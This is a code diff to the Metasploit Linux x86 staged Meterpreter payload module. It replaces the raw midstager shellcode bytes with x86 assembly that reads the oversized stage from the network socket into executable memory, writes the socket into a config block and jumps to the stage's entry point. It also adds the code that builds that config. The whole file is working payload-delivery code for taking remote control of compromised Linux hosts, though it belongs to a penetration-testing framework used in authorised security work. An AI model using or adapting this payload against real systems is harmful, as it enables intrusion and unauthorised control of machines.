@@ -14,8 +14,8 @@ module Metasploit3
   def initialize(info = {})
     super(update_info(info,
       'Name'          => 'Linux Meterpreter',
-      'Description'   => 'Staged meterpreter server',
-      'Author'        => ['PKS', 'egypt'],
+      'Description'   => 'Inject the meterpreter server payload (staged)',
+      'Author'        => ['PKS', 'egypt', 'OJ Reeves'],
       'Platform'      => 'linux',
       'Arch'          => ARCH_X86,
       'License'       => MSF_LICENSE,
@@ -32,6 +32,7 @@ module Metasploit3
     return ep
   end
 
+=begin
   def elf2bin(payload)
     # XXX, not working. Use .c version
 
@@ -61,30 +62,75 @@ module Metasploit3
     print_status("Converted ELF file to memory layout, #{payload.length} to #{used} bytes")
     return mem[0, used]
   end
+=end
 
   def handle_intermediate_stage(conn, payload)
-    # Does a mmap() / read() loop of a user specified length, then
-    # jumps to the entry point (the \x5a's)
+    entry_offset = elf_ep(payload)
+    config_offset = payload.length - generate_meterpreter.length
 
-    midstager = "\x81\xc4\x54\xf2\xff\xff" # fix up esp
-
-    midstager <<
-      "\x6a\x04\x5a\x89\xe1\x89\xfb\x6a\x03\x58" +
-      "\xcd\x80\x57\xb8\xc0\x00\x00\x00\xbb\x00\x00\x04\x20\x8b\x4c\x24" +
-      "\x04\x6a\x07\x5a\x6a\x32\x5e\x31\xff\x89\xfd\x4f\xcd\x80\x3d\x7f" +
-      "\xff\xff\xff\x72\x05\x31\xc0\x40\xcd\x80\x87\xd1\x87\xd9\x5b\x6a" +
-      "\x03\x58\xcd\x80\x3d\x7f\xff\xff\xff\x77\xea\x85\xc0\x74\xe6\x01" +
-      "\xc1\x29\xc2\x75\xea\x6a\x59\x53\xb8\x5a\x5a\x5a\x5a\xff\xd0\xe9" +
-      "\xd1\xff\xff\xff"
-
-
-    # Patch in debug options
-    midstager = midstager.sub("Y", [ datastore['DebugOptions'] ].pack('C'))
-
-    # Patch entry point
-    midstager = midstager.sub("ZZZZ", [ elf_ep(payload) ].pack('V'))
+    encoded_entry = "0x%.8x" % entry_offset
+    encoded_offset = "0x%.8x" % config_offset
+    encoded_debug_options = "0x%.2x" % datastore['DebugOptions'].to_i
 
     # Maybe in the future patch in base.
+
+    # Does a mmap() / read() loop of a user specified length, then
+    # jumps to the entry point (the \x5a's)
+    midstager_asm = %Q^
+      midstager:
+        and esp, 0xFFFFF254
+        push 0x4
+        pop edx
+        mov ecx, esp
+        mov ebx, edi
+        push 0x3
+        pop eax
+        int 0x80
+        push edi
+        mov eax, 0xC0
+        mov ebx, 0x20040000
+        mov ecx, dword ptr [esp+0x4]
+        push 0x7
+        pop edx
+        push 0x32
+        pop esi
+        xor edi, edi
+        mov ebp, edi
+        dec edi
+        int 0x80
+        cmp eax, 0xFFFFFF7F
+        jb start_read
+      terminate:
+        xor eax, eax
+        inc eax
+        int 0x80                                 ; sys_exit
+      start_read:
+        xchg ecx, edx
+        xchg ecx, ebx
+        pop ebx
+      read_loop:
+        push 0x3
+        pop eax
+        int 0x80                                ; sys_read
+        cmp eax, 0xFFFFFF7F
+        ja terminate                            ; exit on error
+        test eax, eax
+        je terminate                            ; exit on error
+        add ecx, eax
+        sub edx, eax
+        jne read_loop                           ; read more
+        ; edx should be at the end, but we need to adjust for the size of the config
+        ; block so we know where to write the socket to memory
+        sub ecx, #{encoded_offset}
+        mov [ecx], ebx                          ; write the socket to the config
+        push #{encoded_debug_options}
+        push ecx                                ; pass in the configuration pointer
+        mov eax, #{encoded_entry}               ; put the entry point in eax
+        call eax
+        jmp terminate
+    ^
+
+    midstager = Metasm::Shellcode.assemble(Metasm::X86.new, midstager_asm).encode_string
 
     print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
     conn.put(midstager)
@@ -96,14 +142,34 @@ module Metasploit3
 
   end
 
-  def generate_stage
-    #file = File.join(Msf::Config.data_directory, "msflinker_linux_x86.elf")
-    file = File.join(Msf::Config.data_directory, "meterpreter", "msflinker_linux_x86.bin")
+  def generate_stage(opts={})
+    meterpreter = generate_meterpreter
+    config = generate_config(opts)
+    meterpreter + config
+  end
 
-    met = File.open(file, "rb") {|f|
-      f.read(f.stat.size)
+  def generate_meterpreter
+    MetasploitPayloads.read('meterpreter', 'msflinker_linux_x86.bin')
+  end
+
+  def generate_config(opts={})
+    opts[:uuid] ||= generate_payload_uuid
+
+    # create the configuration block, which for staged connections is really simple.
+    config_opts = {
+      :arch       => opts[:uuid].arch,
+      :exitfunk   => nil,
+      :expiration => datastore['SessionExpirationTimeout'].to_i,
+      :uuid       => opts[:uuid],
+      :transports => [transport_config(opts)],
+      :extensions => [],
+      :ascii_str  => true
     }
 
-    return met
+    # create the configuration instance based off the parameters
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+
+    # return the binary version of it
+    config.to_b
   end
 end
